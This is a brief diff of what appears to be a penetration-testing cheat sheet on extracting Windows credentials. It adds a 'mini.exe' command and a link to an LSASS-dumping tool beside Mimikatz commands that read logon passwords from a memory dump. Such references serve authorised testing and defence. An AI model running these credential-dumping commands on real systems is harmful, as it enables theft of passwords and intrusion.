@@ -287,6 +287,10 @@ If disabled:
 
 `C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`
 
+`C:\>mini.exe`
+
+https://github.com/b4rtik/ATPMiniDump
+
 ### From box
 
 `mimikatz # privilege::debug`
